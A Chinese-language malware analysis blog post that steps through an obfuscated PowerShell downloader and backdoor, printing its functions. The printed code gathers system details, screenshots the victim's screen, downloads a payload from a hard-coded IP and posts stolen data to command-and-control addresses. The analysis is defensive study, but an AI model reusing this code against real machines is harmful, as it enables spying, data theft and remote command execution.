<h5 id="zokOsMYYZQG1GyNMGDZ"><a href="#zokOsMYYZQG1GyNMGDZ" class="headerlink" title="zokOsMYYZQG1GyNMGDZ()"></a>zokOsMYYZQG1GyNMGDZ()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> zokOsMYYZQG1GyNMGDZ()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$zhXA59XV3lDJhu</span> = ps;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$ZHXA59xV3LDjHU</span> = <span class="string">"Error TaskList"</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$zHxA59xv3lDjHu</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行指令<code>ps</code>,获得进程列表,错误返回”Error TaskList”.</p>
<h5 id="sp169N5"><a href="#sp169N5" class="headerlink" title="sp169N5()"></a>sp169N5()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> sp169N5()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$iYwj2qTWWlSlvnB</span> = <span class="built_in">New-Object</span> System.Net.WebClient;</span><br><span class="line">        <span class="variable">$iYwj2QTWwlSLVNb</span>.proxy = [Net.WebRequest]::GetSystemWebProxy();</span><br><span class="line">        <span class="variable">$iYWj2QtWwLSLvnB</span>.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;</span><br><span class="line">        <span class="variable">$LaYS5yC59zA8PFhrFm9TP</span>=<span class="variable">$Iywj2qtwwlsLVNB</span>.DownloadString(<span class="string">"http://ip-api.com/json"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$LAYS5yC59zA8PFhRfM9Tp</span> = <span class="string">"Error Remote IP"</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$LAYs5yC59za8PFhrFM9TP</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从<a href="http://ip-api.com/json下载回显字符,以json格式保存.错误返回`Error" target="_blank" rel="noopener">http://ip-api.com/json下载回显字符,以json格式保存.错误返回`Error</a> Remote IP`返回如下:<img src="https://i.loli.net/2019/10/01/ovf9WC7StRUhTix.png" alt="image.png"></p>
<h5 id="dYUUIGUfLNIoN"><a href="#dYUUIGUfLNIoN" class="headerlink" title="dYUUIGUfLNIoN()"></a>dYUUIGUfLNIoN()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> dYUUIGUfLNIoN()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$htVH9OtOCbnP7Oa</span> = (<span class="built_in">Get-WMIObject</span> win32_operatingsystem).name;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$HtvH9OtocBNp7OA</span> = <span class="string">"error os Arch"</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$htVH9otOCbnp7OA</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获取系统信息,错误返回”error os Arch”</p>
<p><img src="https://i.loli.net/2019/10/01/kJ7VhFmIZYNH1ln.png" alt="image.png"></p>
<h5 id="L82O-u0EwZy（）"><a href="#L82O-u0EwZy（）" class="headerlink" title="L82O_u0EwZy（）"></a>L82O_u0EwZy（）</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> L82O_u0EwZy()</span><br><span class="line">    &#123;</span><br><span class="line">        lTXXzy53;</span><br><span class="line">        Eda4vnZRBaU37pd7ND;</span><br><span class="line">        zoKoSMyYZqg1gYNmGDZ;</span><br><span class="line">        uTFHxpJCHlXs1OXrEdR;</span><br><span class="line">        SP169n5;</span><br><span class="line">        DyuUigUFlnioN;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>运行上述函数.</p>
<h5 id="finally部分函数"><a href="#finally部分函数" class="headerlink" title="finally部分函数"></a>finally部分函数</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">L82o_u0eWZY | <span class="built_in">out-file</span> <span class="variable">$ENV:temp</span>\log.txt;</span><br><span class="line"><span class="variable">$iYwj2qTwWLslvNB</span> = <span class="built_in">New-Object</span> System.Net.WebClient;</span><br><span class="line"><span class="variable">$IYWj2QtwWLSLVNB</span>.proxy = [Net.WebRequest]::GetSystemWebProxy();</span><br><span class="line"><span class="variable">$iYwj2QTWWLSlVNB</span>.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;</span><br><span class="line"><span class="variable">$m2g9a1mNOtasOaLofMKD</span> = <span class="variable">$EnV:temp</span> +<span class="string">'\log.txt'</span>;</span><br><span class="line"><span class="variable">$QBrjTZAqQWJDJ</span> = <span class="string">"http://185.185.25.175/sDownloads/"</span>;</span><br></pre></td></tr></table></figure>
<p>运行<code>L82o_u0eWZY</code>,将系统心思保存到<code>%temp%\log.txt</code>中,调试得出<code>$m2g9a1mNOtasOaLofMKD</code>是<code>%temp%\log.txt</code></p>
<h5 id="K9Dpje9u4bcbqu351w"><a href="#K9Dpje9u4bcbqu351w" class="headerlink" title="K9Dpje9u4bcbqu351w()"></a>K9Dpje9u4bcbqu351w()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> K9Dpje9u4bcbqu351w()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span>((-<span class="number">1</span> + <span class="number">2</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        niqCW20((<span class="number">1</span> + <span class="number">3</span>));</span><br><span class="line">        <span class="built_in">start-sleep</span> -s ([int](([int](<span class="number">54</span> / <span class="number">3</span>)) / <span class="number">3</span>));</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;               <span class="variable">$IyWj2QTWwLSLVnb</span>.DownloadFile(<span class="string">"http://185.185.25.175/sDownloads/"</span>+ <span class="variable">$RLZNAuZxC9UqzY</span> + <span class="string">'.jpeg'</span>,<span class="variable">$ENV:public</span> +<span class="string">"\"</span>+ <span class="string">"ieee"</span> + <span class="string">".dat"</span>);</span><br><span class="line">            CHr0OkIxe0xiupYa;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_</span>.Exception.Message)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>$RLZNAuZxC9UqzY</code>这个值等于GUID,<img src="https://i.loli.net/2019/10/02/RDgfKCjoh7FGUqB.png" alt="image.png"></p>
<p><code>while(1)</code>死循环直到从”<a href="http://185.185.25.175/sDownloads/&quot;+" target="_blank" rel="noopener">http://185.185.25.175/sDownloads/&quot;+</a> guid+ ‘.jpeg’,然后保存为 <code>%Public%ieee.dat</code></p>
<p>bl4ReiVGQkuTog($nt8brxx)</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Lbl4ReiVGQkuTog(<span class="variable">$nt8brxx</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;     <span class="variable">$LaYS5yC59za8PFHRfm9Tp</span>=<span class="variable">$iywj2qtWwLSLvNB</span>.DownloadString(<span class="variable">$Nt8BrxX</span>);&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$Lq66fcth</span> = <span class="variable">$_</span>.Exception.Message;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$LAYs5yC59zA8PFhrFm9tP</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>$iywj2qtWwLSLvNB</code>是一个<code>WebClient</code>对象,存储了相关信息进行下载.</p>
<h5 id="fwlKy5wjJIz6CGCbzI-上传功能函数"><a href="#fwlKy5wjJIz6CGCbzI-上传功能函数" class="headerlink" title="fwlKy5wjJIz6CGCbzI() 上传功能函数"></a>fwlKy5wjJIz6CGCbzI() 上传功能函数</h5><p><img src="https://i.loli.net/2019/10/02/jqATBFtdcHDkI8i.png" alt="image.png"></p>
<p>死循环无限执行.</p>
<ol>
<li>gc功能提取<code>%temp%\log.txt</code>内容</li>
<li>转换为字符串</li>
<li>返回一个<code>utf-8</code>字符对象</li>
<li>base64转码</li>
<li>返回一个<code>utf-8</code>字符对象</li>
<li>以post方式上传数据</li>
</ol>
<p><img src="https://i.loli.net/2019/10/02/euh924LDNOybrXF.png" alt="image.png"></p>
<p>base64数据传输</p>
<p><img src="https://i.loli.net/2019/10/02/pX6JFcCebHuMEhI.png" alt="image.png"><img src="https://i.loli.net/2019/10/02/pC64S9NomiXjFcr.png" alt="image.png"></p>
<p>数据解析.</p>
<p>到此这个powershell下载上传器大概功能总结完了,简单概括来说就是一个上传电脑信息,下载后门的脚本文件.</p>
<h3 id="backdoor-powershell-ieee-dat"><a href="#backdoor-powershell-ieee-dat" class="headerlink" title="backdoor powershell ieee.dat"></a>backdoor powershell ieee.dat</h3><p><code>%public%\ieee.dat%</code></p>
<p>因为服务器已经关闭了,只能跟着师傅md5找样本了.</p>
<p>从<a href="https://otx.alienvault.com/" target="_blank" rel="noopener">https://otx.alienvault.com</a>找到相关样本信息.</p>
<h4 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h4><p><img src="https://i.loli.net/2019/10/06/ofkVKibWSslyu12.png" alt="image.png"></p>
<ol>
<li>变量u存放的是base64编码后的powershell代码</li>
<li><code>Encoding]::Unicode.GetString([System.Convert]::FromBase64String($u))</code>解码</li>
<li><code>gcm i*v*p*s*n</code>匹配<code>Invoke-Expression</code>执行内存中的powershell命令.</li>
</ol>
<h4 id="0x02-powershell-后门解析"><a href="#0x02-powershell-后门解析" class="headerlink" title="0x02 powershell 后门解析"></a>0x02 powershell 后门解析</h4><p>文件的代码太多了,现在还是根据看起来像是字符串的地方入手</p>
<h5 id="wltJBgnP"><a href="#wltJBgnP" class="headerlink" title="wltJBgnP()"></a>wltJBgnP()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> wltJBgnP()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$thaTh2FrqCarDJH_</span> = <span class="variable">$eNV:username</span>;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$thATH2fRqCarDJh_</span> = <span class="string">"Username Error"</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ThATh2fRqCarDJH_</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获取用户名,失败返回<code>&quot;Username Error&quot;</code></p>
<p>VDf4TkTOMy3p_Br8UL5nH()</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> VDf4TkTOMy3p_Br8UL5nH()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$tSppY_CTU6rBZN_</span> = (<span class="built_in">Get-WMIObject</span> win32_operatingsystem).name;<span class="variable">$tSppY_CTU6rBzN_</span> = <span class="variable">$tsppy_CTu6RBZN_</span>.replace(<span class="string">":"</span>,<span class="string">";"</span>);&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$TsPPy_cTu6rbZN_</span> = <span class="string">"os Name Error"</span>;&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$tSPpy_cTu6rbZN_</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获取系统名称将<code>:</code>替换成<code></code>;`失败返回”os Name Error”</p>
<h5 id="MUHr7u0hahhrAxQ"><a href="#MUHr7u0hahhrAxQ" class="headerlink" title="MUHr7u0hahhrAxQ"></a>MUHr7u0hahhrAxQ</h5><p>接受指令,运行屏幕截图操作,并且以post方式发送base64编码后的png数据,发送到<code>http://83.171.238.62/ls.php?TOKEN=Pomy54tvbRetceX&amp;funx=sc&amp;i={GUID}.png</code></p>
<p>将获取到的cmd命令用<strong>cmd /c</strong>执行,并且将返回的结果数据,经过<code>base64</code>编码,将编码后的数据以<code>Post</code>的方式发送到如下地址<code>http://83.171.238.62/ls.php?TOKEN=Pomy54tvbRetceX&amp;funx=res&amp;R={GUID}</code></p>
<p>如果<code>stratwith</code>函数既没有匹配到<strong>“cmd”</strong>以及<strong>“screenshot”</strong>字符串,则将其用<code>iex</code>命令执行,如果执行成功,就将执行后的返回结果,通过<code>base64</code>编码后,将编码数据以<code>Post</code>方式发送到<code>http://83.171.238.62/ls.php?TOKEN=Pomy54tvbRetceX&amp;funx=res&amp;R={GUID}地址</code></p>
<h5 id="d-1SmifuaaJWTHfuQgh"><a href="#d-1SmifuaaJWTHfuQgh" class="headerlink" title="d_1SmifuaaJWTHfuQgh()"></a>d_1SmifuaaJWTHfuQgh()</h5><p><img src="https://i.loli.net/2019/10/07/HuaI5mAXDM7gOiP.png" alt="image.png">创建webclient对象,模拟代理,下载回显</p>
<h5 id="n-n9tyYOaI9m6lB"><a href="#n-n9tyYOaI9m6lB" class="headerlink" title="n_n9tyYOaI9m6lB()"></a>n_n9tyYOaI9m6lB()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> n_n9tyYOaI9m6lB(<span class="variable">$XSOhPvlsxIYbHLA8bYyj</span>,<span class="variable">$kc5aUnEOK7xCY7Usl1s</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$t45lYeJN</span> = <span class="variable">$kC5auneOk7Xcy7usl1S</span>;</span><br><span class="line">        <span class="variable">$s6d70IV</span> = [System.Net.WebRequest]::Create(<span class="variable">$xsOHpVLsxIybHLa8bYyj</span>);</span><br><span class="line">        <span class="variable">$s6d70iV</span>.proxy = [Net.WebRequest]::GetSystemWebProxy();</span><br><span class="line">        <span class="variable">$s6d70Iv</span>.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;</span><br><span class="line">        <span class="variable">$wOGrHtrYusWGef</span> = [System.Text.Encoding]::UTF8.GetBytes(<span class="variable">$T45lyeJN</span>);</span><br><span class="line">        <span class="variable">$s6D70iv</span>.Method = <span class="string">"POST"</span>;</span><br><span class="line">        <span class="variable">$s6D70IV</span>.ContentLength = <span class="variable">$wogrHTrYuSwGef</span>.length;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$wogRHtRYuswGEf</span>.Length <span class="nomarkup">-gt</span> <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$QOUGx1Qkwlah9W</span> = <span class="variable">$s6d70iv</span>.GetRequestStream();</span><br><span class="line">            <span class="variable">$qoUgx1Qkwlah9W</span>.Write(<span class="variable">$wOgRHTRyuswGEF</span>, (<span class="number">1</span> - <span class="number">1</span>), <span class="variable">$wogrhtryuswgef</span>.Length);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        [System.Net.WebResponse] <span class="variable">$rAtaxJplMEbTuO8yApqOg</span> = <span class="variable">$S6D70Iv</span>.GetResponse();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$rAtAXjpLMeBTuo8Yapqog</span> <span class="nomarkup">-ne</span> <span class="literal">$NUlL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$EgAFhyjSEtNkIMP714inO</span> = <span class="variable">$RatAXjPLMEbtuO8yAPQOg</span>.GetResponseStream();</span><br><span class="line">            [System.IO.StreamReader] <span class="variable">$Cx3Ig4SFBZ75udmdkzK2</span> = <span class="built_in">New-Object</span> System.IO.StreamReader <span class="variable">$EGAfhyjSeTNkIMP714ino</span>;</span><br><span class="line">            [String] <span class="variable">$FsVCEsC5h</span> = <span class="variable">$cx3IG4SfbZ75uDmdkZk2</span>.ReadToEnd();</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fsVcESC5h</span> = (<span class="string">"httpPOST"</span> + <span class="variable">$_</span>.Exception.Message);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$FsVceSC5H</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>第一个参数是请求的地址,第二个参数是请求的内容</li>
<li><code>[System.Net.WebRequest]::Create</code>传入第一个参数初始化<code>WebRequest</code>实例</li>
<li>获取本地ie代理,并设置为默认证书</li>
<li>采用utf-8编码数据</li>
<li>使用<code>POST</code>发送</li>
<li>如果长度大于0,发送<code>GetRequestStream().Write()</code>请求山上,然后<code>.GetResponse()</code>接收数据</li>
<li>如果回显非空,<code>.GetResponseStream()</code>读入数据流,全部读取.</li>
</ol>
<h5 id="Aj9VVbP5C"><a href="#Aj9VVbP5C" class="headerlink" title="Aj9VVbP5C()"></a>Aj9VVbP5C()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Aj9VVbP5C()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;<span class="variable">$Uy7hTSuBKQe33iYx5F74</span> = (<span class="built_in">Get-WmiObject</span> Win32_OperatingSystem).OSArchitecture;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;<span class="variable">$uy7hTsubkQE33Iyx5f74</span> = <span class="string">"Architecture Error"</span>;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$UY7HTSuBkQE33iYX5f74</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获取系统位数<code>wmic.exe</code>使用<code>Win32_OperatingSystem).OSArchitecture</code></p>
<p>错误返回<code>&quot;Architecture Error&quot;</code>.</p>
<h5 id="Get-Screenshot"><a href="#Get-Screenshot" class="headerlink" title="Get-Screenshot"></a>Get-Screenshot</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Get-Screenshot</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">Add-Type</span> -Assembly System.Windows.Forms;</span><br><span class="line">    <span class="variable">$I6G70ff34UmS</span> = [Windows.Forms.SystemInformation]::VirtualScreen;</span><br><span class="line">    <span class="variable">$EFZ1lbLwseYcDKV7</span> = <span class="built_in">New-Object</span> Drawing.Bitmap <span class="variable">$I6g70Ff34uMS</span>.Width, <span class="variable">$I6g70FF34ums</span>.Height;</span><br><span class="line">    <span class="variable">$sOmy4QAQ9e</span> = [Drawing.Graphics]::FromImage(<span class="variable">$eFz1LbLWSeYcdkv7</span>);</span><br><span class="line">    <span class="variable">$SOmY4QAQ9e</span>.CopyFromScreen( <span class="variable">$I6g70ff34UMs</span>.Location, [Drawing.Point]::Empty, <span class="variable">$I6g70fF34umS</span>.Size);</span><br><span class="line">    <span class="variable">$SoMY4qAq9e</span>.Dispose();</span><br><span class="line">    <span class="variable">$sb3uxBawrTjS5HJ4zIaU</span> = <span class="built_in">New-Object</span> System.IO.MemoryStream;</span><br><span class="line">    <span class="variable">$EFz1lblwseyCdkV7</span>.save(<span class="variable">$SB3uxBAWRtjS5hj4zIaU</span>, [Drawing.Imaging.ImageFormat]::Png);</span><br><span class="line">    <span class="variable">$EFZ1lBLWSeycDkv7</span>.Dispose();</span><br><span class="line">    [convert]::ToBase64String(<span class="variable">$SB3UxbAWrTjS5hj4ZIau</span>.ToArray());</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获取虚拟屏幕,设置bitmap长宽高,<code>CopyFromScreen</code>将屏幕图像拷贝到新创建的绘制图像的对象中.将图像保存为<code>png</code>图片格式并且将图片数据存入<code>内存流</code>中.将png图片的内存流数据转数组后进行<code>base64</code>编码后返回加密后的值</p>
<h5 id="S4xKxH-WG0KMOE"><a href="#S4xKxH-WG0KMOE" class="headerlink" title="S4xKxH_WG0KMOE()"></a>S4xKxH_WG0KMOE()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> S4xKxH_WG0KMOE()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$zKxMjXPiRVG_n5lBSQ</span> = D_1smifUAajwThfuQgh(<span class="string">"https://api.ipify.org/"</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ZKxmjXPiRvg_N5LBSq</span> = <span class="string">"IP Error"</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ZKxMJXpIrVG_n5lBSq</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获取ip地址,错误返回<code>IP Error</code></p>
<h5 id="CwC1Fafld-XtJSe6wx"><a href="#CwC1Fafld-XtJSe6wx" class="headerlink" title="CwC1Fafld_XtJSe6wx()"></a>CwC1Fafld_XtJSe6wx()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> CwC1Fafld_XtJSe6wx()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="built_in">Test-Path</span> -Path (<span class="string">"HKCU:\SOFTWARE\Microsoft\key"</span>)) <span class="nomarkup">-eq</span> <span class="literal">$True</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$OEnh0UdnFPnPN</span> = (<span class="built_in">Get-ItemProperty</span> -Path <span class="string">"HKCU:\SOFTWARE\Microsoft\key"</span> -Name SecretKey).SecretKey;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$R_17TGuFklA1FDgTjmDMN</span> = <span class="built_in">New-Item</span> -Path <span class="string">"HKCU:\SOFTWARE\Microsoft"</span> -Name key -Force;</span><br><span class="line">        <span class="built_in">start-sleep</span> -s <span class="number">2</span>;</span><br><span class="line">        <span class="variable">$VgMxEqS7XdszsJidfE</span> = [guid]::NewGuid().Guid;</span><br><span class="line">        <span class="built_in">Set-ItemProperty</span> -Path <span class="string">"HKCU:\Software\Microsoft\key"</span> -Name SecretKey -Value <span class="variable">$VgMxEqS7XDSzSjidfe</span>;</span><br><span class="line">        <span class="built_in">start-sleep</span> -s <span class="number">2</span>;</span><br><span class="line">        <span class="variable">$oEnH0udnFPNpN</span> = <span class="variable">$vGMxEQS7XDSzsJIdfe</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$oenH0udnfpnpN</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>检查键值是否存在.如果存在获得键值.不存在的话新建项,再创建健值,写入guid.</p>
<h5 id="QTix4hIfIA2oQE8g"><a href="#QTix4hIfIA2oQE8g" class="headerlink" title="QTix4hIfIA2oQE8g()"></a>QTix4hIfIA2oQE8g()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> QTix4hIfIA2oQE8g()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$UC55RYB_3NieoNp</span> = <span class="built_in">New-Object</span> Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent());</span><br><span class="line">        <span class="variable">$mmMfY1GeC_ZHoT3</span> = <span class="variable">$uC55ryb_3Nieonp</span>.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$mMmFY1GeC_ZHoT3</span> <span class="nomarkup">-eq</span> <span class="literal">$TRUe</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$mMMfY1GeC_zHoT3</span> = <span class="string">"Admin"</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span> (<span class="variable">$MMMFy1GEC_zHoT3</span> <span class="nomarkup">-eq</span> <span class="literal">$false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$mMMfy1GEc_zhot3</span> = <span class="string">"User"</span>;</span><br><span class="line">        &#125;      </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$mMMFY1gEc_zHoT3</span> = <span class="string">"Error Role"</span>;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$mMMfY1GEC_zHoT3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
